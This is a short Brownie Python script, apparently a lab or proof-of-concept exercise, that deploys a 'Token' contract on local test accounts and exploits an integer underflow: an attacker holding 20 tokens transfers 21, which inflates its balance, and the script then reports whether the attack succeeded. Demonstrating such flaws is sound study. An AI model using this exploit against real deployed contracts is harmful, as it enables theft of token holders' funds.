from brownie import *
from .reports import *


a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)

REPORT = Report()
REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def main():
    target = prepare()
    attack(target)

def prepare():
    # deploy the target contract
    target = Token.deploy(100*BIGNUMBER,{'from': a0})
    REPORT.add_token(target)

    # attacker should start with little ETH balance and small token balance
    balance_to_burn = a1.balance() - 1*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)
    target.transfer(a1,20,{'from': a0})

    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')
    return target

def attack(target):

    # send 20 tokens somewhere to have underflow
    target.transfer(a0,21,{'from':a1})

    if target.balanceOf(a1) > 20:
        REPORT.txt_print('ATTACK SUCCESSFUL')
    else:
        REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
